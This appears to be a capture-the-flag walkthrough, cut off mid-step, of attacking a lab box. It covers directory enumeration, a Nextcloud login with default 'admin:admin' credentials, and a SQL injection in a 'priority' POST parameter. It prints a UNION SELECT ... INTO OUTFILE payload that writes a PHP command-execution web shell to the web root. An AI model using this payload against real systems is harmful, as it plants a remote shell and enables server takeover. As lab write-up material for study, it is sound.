## Enumeration

Port `17445` shows a web page of an issue tracker.

We can register users and log in.

Port `30455` shows us a web page with no links.

Using `feroxbuster`, we find a `nextcloud` instance.

Trying `admin:admin` works.

We find the issue tracker project in here.

Download and explore it, and we have the `mysql` password.

We can see that the `priority` parameter is injectable in the `checkByPriority` function.

So going to the web...

GET is not allowed, so POST? Capture the request with `caido`.

Changing GET to POST.

And adding the `priority` parameter, we got to `200`.

We saw with `feroxbuster` that there is a `phpinfo` that shows that the root path is `/srv/http`, so we can inject a webshell.

We can inject a web shell:

```shell
' union select '<?php echo system($_REQUEST["bingo"]); ?>' into outfile '/srv/http/cmd.php' -- -
```

Encode with [https://www.url-encode-decode.com/](https://www.url-encode-decode.com/)

Accessing the path...
